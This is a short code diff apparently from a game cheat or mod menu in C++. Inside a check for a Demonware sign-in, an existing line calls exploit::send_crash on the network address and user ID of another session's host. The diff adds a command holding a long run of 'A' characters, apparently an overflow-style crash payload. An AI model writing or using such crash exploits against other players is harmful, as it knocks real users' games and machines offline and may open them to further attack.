@@ -520,6 +520,7 @@ namespace menu
 							session && game::Live_IsUserSignedInToDemonware(0)))
 						{
 							exploit::send_crash(session->host.info.netAdr, session->host.info.xuid);
+							command::execute("@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
 						}
 					}
 					
